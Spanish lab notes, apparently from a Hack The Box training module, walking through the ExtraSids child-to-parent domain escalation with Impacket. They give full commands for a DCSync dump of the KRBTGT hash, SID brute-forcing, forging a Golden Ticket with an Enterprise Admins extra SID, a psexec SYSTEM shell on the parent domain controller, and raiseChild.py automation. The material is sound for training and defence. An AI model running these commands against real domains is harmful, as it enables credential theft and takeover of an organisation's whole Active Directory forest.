
El ataque de ExtraSids tambien se puede realizar desde Linux. Necesitamos:

- El hash KRBTGT para el dominio hijo

Una vez tengamos el control total en el dominio hijo podemos usar secretsdump.py para realizar un DCSync y obtener el hash NTLM de KRBTGT

```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

- El SID (Security Identifier) para el dominio hijo

Podemos usar [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) para realizar una fuerza bruta de SID para encontrar el SID del dominio hijo (la IP es la del DC del dominio hijo). Nos devuelve el SID y el RID de cada usuario que podrian usarse para crear el DOMAIN-SID-RID de cada usuario

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

Podemos usar grep para quitar ruido

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

- El nombre de un usuario objetivo en el dominio hijo (¡no necesita existir!)
- El FQDN (Fully Qualified Domain Name) del dominio hijo
- El SID del grupo Enterprise Admins del dominio raíz

Podemos volver a usar [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) apuntando al DC del dominio padre y junto con el RID del grupo sacar su SID completo

## Ataque

1. Usamos [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) para construir un Golden Ticket que sera valido para acceder a recursos en el dominio

```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
![[Pasted image 20261005171647.png]]


2. El archivo .ccache generado lo establecemos a la variable KRB5CCNAME

```
export KRB5CCNAME=hacker.ccache
```


3. Ahora con el ticket ccache en la memoria podemos abrir una shell con psexec como SYSTEM en el DC del dominio padre

```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

## Ataque con RaiseChild.py

Impacket también tiene la herramienta [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), que automatizará la escalada de un dominio hijo a uno padre. Necesitamos especificar el controlador de dominio objetivo y las credenciales de un usuario administrativo en el dominio hijo; el script hará el resto. Si revisamos la salida, vemos que comienza enumerando los nombres de dominio completos (FQDN) del dominio hijo y del padre. Luego:

- Obtiene el SID para el grupo Enterprise Admins del dominio padre
- Recupera el hash de la cuenta KRBTGT en el dominio hijo
- Crea un Golden Ticket
- Inicia sesión en el dominio padre
- Recupera las credenciales de la cuenta Administrator en el dominio padre

Finalmente, si se especifica el parámetro `target-exec`, se autentica en el controlador de dominio del dominio padre a través de Psexec.

```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
